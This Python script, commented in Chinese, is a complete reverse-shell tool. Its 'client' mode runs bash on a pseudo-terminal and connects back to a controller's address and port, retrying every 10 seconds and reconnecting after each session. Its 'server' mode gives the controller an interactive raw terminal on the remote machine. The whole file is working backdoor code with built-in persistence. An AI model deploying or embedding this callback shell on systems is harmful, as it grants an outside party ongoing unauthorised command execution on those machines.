#!/usr/bin/env python3
# coding=utf-8
# date 2022-01-12 15:44:57
# author calllivecn <c-all@qq.com>

"""
这里是使用反向shell连接到服务端的, Server是控制端，client是被控制端。
"""

import os
import sys
import pty
import tty
import time
import fcntl
import socket
import struct
import signal
import logging
import termios
import argparse
import traceback
import threading
import selectors
from subprocess import Popen


SHELL='bash'
STDIN = sys.stdin.fileno()
# STDIN = sys.stdin
STDOUT = sys.stdout.fileno()


def getlogger(level=logging.INFO):
    fmt = logging.Formatter("%(asctime)s %(filename)s:%(funcName)s:%(lineno)d %(message)s", datefmt="%Y-%m-%d-%H:%M:%S")

    stream = logging.StreamHandler(sys.stdout)
    stream.setFormatter(fmt)

    fp = logging.FileHandler("rshell.logs")
    fp.setFormatter(fmt)

    logger = logging.getLogger("rshell")
    logger.setLevel(level)
    logger.addHandler(stream)
    logger.addHandler(fp)
    return logger


logger = getlogger()


def get_pty_size(fd):
    size = fcntl.ioctl(fd, termios.TIOCGWINSZ, b"0000") # 占位符
    return struct.unpack("HH", size)

def set_pty_size(fd, columns, rows):
    size = struct.pack("HH", columns, rows)
    # 这个返回还知道是什么
    return fcntl.ioctl(fd, termios.TIOCSWINSZ, size)


# 窗口大小调整
def signal_SIGWINCH_handle(sigNum, frame):
    size = get_pty_size(STDOUT)
    # logger.info(f"窗口大小改变: {size}")
    set_pty_size(STDOUT, *size)
    # logger.info("sigwinch 执行完成")


def socketshell(sock, size):
    try:
        env = os.environ.copy()
        pty_master, pty_slave = pty.openpty()

        # 设置对面 终端大小
        set_pty_size(pty_slave, *size)

        ss = selectors.DefaultSelector()

        ss.register(pty_master, selectors.EVENT_READ)
        ss.register(sock, selectors.EVENT_READ)

        p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid, universal_newlines=True)

        BREAK=False
        # while p.poll() is None:
        while True:

            for key, event in ss.select():

                fd = key.fileobj
                if fd == sock:
                    data = sock.recv(1024)
                    logger.debug(f"sock recv: {data}")
                    
                    # 在peer挂掉的情况下会出现
                    if data == b"":
                        # p 的关闭 放到 finally
                        BREAK=True
                        break
                    os.write(pty_master, data)

                elif fd == pty_master:
                    data = os.read(pty_master, 1024)
                    logger.debug(f"pty read: {data}")
                    if data:
                        sock.send(data)
                    else:
                        BREAK=True
                        break

                # 这样按一次ctrl+D，就会正常退出了.
                if p.poll() is not None:
                    BREAK=True
                    break

            if BREAK:
                break

            #logger.info("新的一轮 select()")
    except Exception as e:
        # raise e
        logger.info(f"捕获到异常退出: {e}")

    finally:
        sock.close()
        ss.close()
        p.terminate()
        logger.info("sock exit")


def server(addr, port):
    server_addr = (addr, port)
    logger.info(f"{sys.argv[0]} listen: {server_addr}")

    try:
        signal.signal(signal.SIGWINCH, signal_SIGWINCH_handle)

        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        sock.bind(server_addr)
        sock.listen(5)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, True)

        client, addr = sock.accept()
        logger.info(f"有反向shell连接上: {addr}")


        size = get_pty_size(STDIN)
        logger.info(f"向对面发送终端大小： {size}")
        client.send(struct.pack("!HH", *size))
    
        # 关闭监听
        sock.close()

        # tty 
        tty_bak = termios.tcgetattr(STDIN)
        # tty.setraw(STDIN)
        # 根这样没有关系。。。
        tty.setraw(STDIN, termios.TCSADRAIN)

        ss = selectors.DefaultSelector()
        ss.register(client, selectors.EVENT_READ)
        ss.register(STDIN, selectors.EVENT_READ)

        exit_flag = True
        while exit_flag:

            for key, event in ss.select():

                fd = key.fileobj
                if fd == client:
                    data = client.recv(1024)
                    if data == b"":
                        exit_flag = False
                        logger.debug(f"server client.recv 空: {data}")
                        break
                    os.write(STDOUT, data)

                elif fd == STDIN:
                    data = os.read(STDIN, 1024)
                    client.send(data)

        logger.debug(f"exit_flag: {exit_flag} 退出了")
    except Exception:
        traceback.print_exc()

    finally:
        client.close()
        ss.close()
        termios.tcsetattr(STDIN, termios.TCSADRAIN, tty_bak)
        logger.info("logout")


def client(addr, port=6789):
    if addr == "":
        logger.info("client 需要 server 地址")
        return
    
    server_addr = (addr, port)

    # sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    # sock.settimeout(10)

    GO=False
    while True:
        try:
            sock = socket.create_connection(server_addr, timeout=10)
        except TimeoutError:
            logger.info(f"连接超时。。。重新连接")
            GO=True
        except ConnectionRefusedError:
            logger.info(f"服务端口关闭，等待重新打开。。。")
            GO=True
        except socket.gaierror:
            logger.info(f"域名不存在")
            GO=True
        except Exception:
            traceback.print_exc()
            GO=True
        
        if GO:
            time.sleep(10)
            continue

        # 拿到初始化终端大小
        """
        # 感觉一次只发4个字节，tcp也应该是需要一次接收
        size_d = b""
        while True:
            d = sock.recv(1)
            if d == b"":
                logger.info("Peer关闭")
                sock.close()

                
                size_d += d
        """
        # 感觉一次只发4个字节，tcp也应该是需要一次接收
        size = sock.recv(4)
        size = struct.unpack("!HH", size)

        logger.info(f"client connect: {server_addr}")
        th = threading.Thread(target=socketshell, args=(sock, size), daemon=True)
        th.start()
        th.join()
        logger.info(f"连接server: {server_addr}, 正常退出")
        time.sleep(10)


def main():
    parse = argparse.ArgumentParser(
        usage="%(prog)s <命令> [option]",
        description="反向shell连接",
        epilog="END",
    )

    # parse.add_argument("--client", action="store_true", help="使用client端")
    # parse.add_argument("--addr", default="", help="需要连接的IP或域名")
    # parse.add_argument("--port", default=6789, type=int, help="端口")

    subparsers = parse.add_subparsers(title="指令", metavar="")
    server_func =  subparsers.add_parser("server", help="启动服务端")
    client_func = subparsers.add_parser("client", help="使用client端")

    # server_func.add_argument("--cmd", default=SHELL, help=f"需要使用的交互程序(default: {SHELL})")
    server_func.add_argument("--addr", default="", help="需要连接的IP或域名")
    server_func.add_argument("--port", default=6789, type=int, help="端口")

    client_func.add_argument("--addr", default="", help="需要连接的IP或域名")
    client_func.add_argument("--port", default=6789, type=int, help="端口")

    parse.add_argument("--parse", action="store_true", help=argparse.SUPPRESS)

    parse.add_argument("--debug", action="store_true", help=argparse.SUPPRESS)

    server_func.set_defaults(func=lambda args :server(args.addr, args.port))
    
    client_func.set_defaults(func=lambda args :client(args.addr, args.port))

    args = parse.parse_args()

    if args.parse:
        logger.info(args)
        sys.exit(0)
    
    if args.debug:
        logger.setLevel(logging.DEBUG)
    
    try:
        return args.func(args)
    except KeyboardInterrupt:
        pass

    # parse.print_help()
    # sys.exit(1)


if __name__ == "__main__":
    main()